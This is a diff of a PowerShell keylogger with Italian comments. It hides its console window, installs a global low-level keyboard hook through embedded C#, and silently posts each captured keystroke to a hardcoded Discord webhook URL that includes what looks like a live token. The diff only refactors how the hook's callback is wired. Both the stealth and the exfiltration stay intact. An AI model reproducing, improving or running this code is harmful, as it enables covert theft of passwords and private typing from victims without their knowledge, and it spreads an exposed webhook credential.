@@ -1,5 +1,3 @@
-
-
 # --- Configurazione ---
 $webhookUrl    = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
 $scriptPath    = $MyInvocation.MyCommand.Definition
@@ -32,7 +30,7 @@ public class Win {
 "@
 [Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
 
-# --- Global keyboard hook via Add-Type (senza null‑conditional) ---
+# --- Global keyboard hook via Add-Type con callback statica ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -42,22 +40,18 @@ using System.Windows.Forms;
 public class GlobalKeyboardListener {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN     = 0x0100;
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
     private static LowLevelKeyboardProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
-
-    public delegate void KeyPressedHandler(string key);
-    public static event KeyPressedHandler OnKeyPressed;
+    public static Action<string> Callback;
 
     [DllImport("user32.dll", SetLastError=true)]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
     [DllImport("user32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
     [DllImport("user32.dll")]
     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 
@@ -77,31 +71,23 @@ public class GlobalKeyboardListener {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
             string key = ((Keys)vkCode).ToString();
-            // invoke only if subscribed
-            if (OnKeyPressed != null) {
-                OnKeyPressed(key);
-            }
-            // ESC per uscire
-            if ((Keys)vkCode == Keys.Escape) {
-                Stop();
-                Application.Exit();
-            }
+            if (Callback != null) { Callback(key); }
+            if ((Keys)vkCode == Keys.Escape) { Stop(); Application.Exit(); }
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
-
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 }
 "@ -ReferencedAssemblies "System.Windows.Forms"
 
-# --- Gestione evento e invio al webhook Discord ---
-[GlobalKeyboardListener]::OnKeyPressed += {
+# --- Assegna callback al listener ---
+$cb = [System.Action[string]]{
     param($k)
     try {
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $k } | ConvertTo-Json) -ContentType "application/json"
     } catch { }
 }
+[GlobalKeyboardListener]::Callback = $cb
 
-# --- Avvio hook (invisibile) ---
+# --- Avvio del hook invisibile ---
 [GlobalKeyboardListener]::Start()
 [System.Windows.Forms.Application]::Run()
